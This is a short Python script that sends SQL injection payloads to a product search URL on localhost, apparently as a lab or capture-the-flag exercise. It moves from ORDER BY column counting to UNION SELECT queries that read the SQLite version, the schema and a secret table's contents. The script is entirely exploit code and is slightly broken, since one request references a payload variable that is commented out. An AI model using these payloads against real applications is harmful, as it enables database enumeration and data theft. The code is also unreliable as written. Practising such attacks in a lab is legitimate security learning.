import requests

BASE_URL = "http://localhost:3000"

# http://localhost:3000/products/search?query=widget&commit=Search

session = requests.Session()

payload_1 = "widget' ORDER BY 7; --"

url = f"{BASE_URL}/products/search?query={payload_1}"
r = session.get(url)

# print(r.text)

# payload_2 = "widget' UNION ALL SELECT 1,2,3,4,5,6,7; --"

# payload_2 = "widget' UNION ALL SELECT 1,2,3,4,'https://picsum.photos/seed/105/150',6,7; --"
# url = f"{BASE_URL}/products/search?query={payload_2}"
# r = session.get(url)

# print(r.text)

payload_3 = "widget' UNION ALL SELECT sqlite_version(),sqlite_version(),3,4,'https://picsum.photos/seed/105/150',6,7; --"
url = f"{BASE_URL}/products/search?query={payload_2}"
r = session.get(url)

# SELECT sql FROM sqlite_schema
payload_4 = "widget' UNION ALL SELECT 1,sql,3,4,'https://picsum.photos/seed/105/150',6,7 FROM sqlite_schema; --"
# url = f"{BASE_URL}/products/search?query={payload_4}"
# r = session.get(url)

# print(r.text)

payload_5 = "widget') UNION ALL SELECT 1,content,3,4,'https://picsum.photos/seed/105/150',6,7 FROM this_is_very_secret_long_table_names; --"
# url = f"{BASE_URL}/products/search?query={payload_5}"
# r = session.get(url)

print(r.text)
print(url)
